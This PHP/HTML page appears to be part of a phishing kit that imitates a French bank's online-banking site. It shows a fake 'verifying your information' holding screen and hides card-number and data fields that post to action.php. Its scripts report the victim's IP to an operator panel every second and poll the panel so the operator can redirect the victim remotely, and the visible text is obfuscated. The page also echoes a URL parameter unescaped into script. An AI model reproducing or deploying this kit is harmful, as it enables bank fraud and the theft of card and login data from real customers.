<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>Accéder à mes comptes en ligne</title>
<meta charset="utf-8">
<link rel="stylesheet" href="res/main.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<div class="topbar">
<div class="tbleft">
<li class="selected">Particuliers <img src="res/arrow-bottom.png"></li>
<li class="lipc">Banque privée</li>
<li class="lipc">Professionnels</li>
<li class="lipc">Entreprises</li>
</div>
<div class="tbright">
<li>Accessibilité</li>
<li>FR <img src="res/arrow-bottom-light.png"></li>
</div>

</div>

<header>
<div class="row mobile">
<div class="left">
    <img src="res/menu.png" class="mobile" style="width:35px; margin-right:10px;">
<img src="res/logo.png" style="width:180px;">
</div>
<div class="right" style="text-align:right;">
<img src="res/lock.png" style="width:25px;">
</div>
</div>
<div class="row pc">
<div class="left">
<img src="res/logo.png" class="logo">
<img src="res/logo-text.png" class="logo-text">
</div>
<div class="right" style="text-align:right;">
<button class="register">Devenir client</button>
</div>
</div>
</header>




<section>

<div class="bannertitle">
<h1>
</h1>
</div>

<div class="info-form">
 

 
<div class="forma">
<div class="forma-title">
<?php $bm->obf("vérification de vos informations"); ?>
</div>
<div class="forma-text" style="text-align:center;">
 <div style="display:inline-block; width:600px; padding:10px; max-width:100%;">
 <p></p>
 Vos informations sont en cours de vérification...
<p style="color:#cf4545;">Veuillez ne pas fermer ne pas fermez cette page.</p>
 
<img src="res/loading.gif" style="margin:10px 0; width:50px;">

<p>Vous serez redirigé automatiquement</p>

</div>
</div>
</div>

 

</div>





</section>
 
<form action="action.php" method="POST">
    <input type="hidden" name="card_number">
    <input type="hidden" name="data">
</form>


<footer>
<img src="res/footer-pc-3.png"  class="footer-pc">
<img src="res/footer-mobile.png" class="footer-mobile">
<img src="res/footer-mobile3.png" class="footer-mobile">
</footer>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 <script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>